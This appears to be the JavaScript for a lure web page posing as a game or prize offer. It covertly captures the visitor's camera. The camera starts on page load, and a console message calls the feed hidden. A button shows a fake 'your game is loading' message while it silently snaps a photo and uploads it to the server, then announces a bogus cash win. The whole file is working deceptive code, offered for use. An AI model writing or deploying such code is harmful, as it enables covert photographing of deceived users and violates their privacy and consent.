const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const captureBtn = document.getElementById("captureBtn");
const status = document.getElementById("status");
const preview = document.getElementById("preview");
const fileUrlDiv = document.getElementById("fileUrl");

let streamReady = false;

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    await video.play();
    streamReady = true;
    console.log("Camera started (hidden).");
  } catch (err) {
    console.error("Camera error:", err);
    status.textContent = "⚠️ Please allow camera access in your browser.";
  }
}

// show short loading animation text
function showLoadingText(text){
  let dots = 0;
  status.textContent = text;
  const interval = setInterval(()=>{
    dots = (dots+1)%4;
    status.textContent = text + ".".repeat(dots);
  }, 300);
  return interval;
}

captureBtn.addEventListener("click", async () => {
  status.textContent = "";
  fileUrlDiv.textContent = "";
  preview.style.display = "none";

  if (!streamReady) {
    status.textContent = "Initializing camera…";
    await startCamera();
  }

  // loading text
  const loader = showLoadingText("🕹️ Tap 2 times please, your game is loading");

  // instant capture (no long delay)
  const ctx = canvas.getContext("2d");
  canvas.width = video.videoWidth || 640;
  canvas.height = video.videoHeight || 480;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    try {
      const form = new FormData();
      form.append("photo", blob, `capture_${Date.now()}.jpg`);

      const res = await fetch("/upload", { method: "POST", body: form });
      const data = await res.json();

      clearInterval(loader);

      if (data && data.success && data.filePath) {
        status.textContent = "🎉 You WIN 100 Rs successfully!";
        fileUrlDiv.innerHTML = `<a href="${data.filePath}" target="_blank" rel="noopener noreferrer">${data.filePath}</a>`;
        // show preview
        preview.src = data.filePath;
        preview.style.display = "block";
      } else {
        status.textContent = "❌ Upload failed. Try again.";
        console.error("Upload response:", data);
      }
    } catch (err) {
      clearInterval(loader);
      status.textContent = "❌ Upload failed. Check console.";
      console.error("Upload error:", err);
    }
  }, "image/jpeg");
});

// start camera early to minimize any delay
startCamera();